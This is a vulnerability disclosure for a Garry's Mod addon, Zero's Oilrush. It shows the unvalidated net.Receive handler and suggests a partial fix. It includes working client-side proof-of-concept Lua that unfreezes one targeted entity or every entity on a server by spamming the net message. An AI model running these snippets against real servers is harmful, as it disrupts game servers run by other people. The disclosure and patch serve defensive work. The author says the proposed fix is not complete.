# Zero's Oilrush Net Exploit
Found by OverlordAkise on 2021.06.15  
Version tested was 1.0.7B
Addon can be bought at [https://www.gmodstore.com/market/view/zero-s-oilrush-oilscript](https://www.gmodstore.com/market/view/zero-s-oilrush-oilscript)  


Zero's Oilrush has a Net Exploit in the `zrush_FuelSplitUIGotClosed_net` net.Receive function.

### TL;DR
The addon doesn't verify anything in the specified net.Receive function.  
The net.Receive function wakes the entity and enables motion. This means that a player can make any entity unfrozen by sending it to the server over this net channel.  

### The Code
This is the unformatted Code that is responsible for the Exploit:
```LUA 
net.Receive("zrush_FuelSplitUIGotClosed_net",function(len,ply)
  local entIndex = net.ReadFloat()
  local ent = Entity(entIndex)
  if(!IsValid(ent))then
    return
  end
  ent.IsInUse = false
  local phys = ent:GetPhysicsObject()
  if (phys:IsValid()) then
    phys:Wake()
    phys:EnableMotion(true)
  end
end)
```

### The Problem
The receiving function doesn't check if the entity is actually from this addon.  
This means that a player can send any entity-index they want and the server will unfreeze it. This enables players to make props collide with each other again or move vending machines around after unfreezing them from permaprop's freeze when they spawn.  

The easiest way to demonstrate this would be the following code:  
```LUA
net.Start("zrush_FuelSplitUIGotClosed_net")
  net.WriteFloat(LocalPlayer():GetEyeTrace().Entity:EntIndex())
net.SendToServer()
```  
This unfreezes the entity you are looking at.  
You can unfreeze any entity, no matter who it belongs to, even map entities.  

### Example Code
Another example, except the one above, would be to unfreeze every entity on the server:
```LUA
for k,v in pairs(ents.GetAll()) do
  net.Start("zrush_FuelSplitUIGotClosed_net")
    net.WriteFloat(v:EntIndex())
  net.SendToServer()
end
```  
The above code iterates over every entity and sends it to the server for unfreezing. This works because the receiving net function doesn't have any spam protection.  


### Fixing the exploit
I don't know the name of every entity from Zero's Oilrush, but the easiest fix would be to only unfreeze zero entities:
This would make this
```LUA
net.Receive("zrush_FuelSplitUIGotClosed_net",function(len,ply)
  local entIndex = net.ReadFloat()
  local ent = Entity(entIndex)
  if(!IsValid(ent))then
    return
  end
  ent.IsInUse = false
  local phys = ent:GetPhysicsObject()
  if (phys:IsValid()) then
    phys:Wake()
    phys:EnableMotion(true)
  end
end)
```  
to this
```LUA
net.Receive("zrush_FuelSplitUIGotClosed_net",function(len,ply)
  local entIndex = net.ReadFloat()
  local ent = Entity(entIndex)
  if(!IsValid(ent))then
    return
  end
  if not string.find(ent:GetClass(),"zero_") then return end
  ent.IsInUse = false
  local phys = ent:GetPhysicsObject()
  if (phys:IsValid()) then
    phys:Wake()
    phys:EnableMotion(true)
  end
end)
```  
This doesn't make the code "completely secure" again, but it helps against most exploits that could've been done with it. (Another needed feature would be an anti-spam measurement.)  

